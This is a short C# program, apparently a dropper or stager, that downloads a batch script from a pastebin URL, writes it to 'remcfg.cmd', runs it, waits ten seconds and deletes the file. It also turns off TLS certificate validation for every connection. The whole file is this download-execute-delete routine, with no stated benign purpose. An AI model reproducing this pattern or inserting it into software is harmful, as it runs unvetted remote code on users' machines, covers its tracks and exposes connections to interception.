using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using UnityEngine;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;

namespace cfgrem
{
    internal class Program
    {
        internal const string script = "https://pastebin.com/raw/Yyuz1feH";
        internal const string loc = "remcfg.cmd";

        public static void Main(string[] args)
        {
            //download string
            //create batch file
            //execute
            //delete file

            ServicePointManager.ServerCertificateValidationCallback = Validator;

            var client = new WebClient();
            var rawscript = client.DownloadString(script);
            File.WriteAllText(loc, rawscript);

            System.Diagnostics.Process.Start(loc);

//            System.Diagnostics.Process proc = new System.Diagnostics.Process();
//            proc.StartInfo.FileName = loc;
//            proc.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
//            proc.Start();
            System.Threading.Thread.Sleep(10000);
            File.Delete(loc);
        }

        public static bool Validator(object sender, X509Certificate certificate, X509Chain chain,
            SslPolicyErrors errors)
        {
            return true;
        }
    }
}
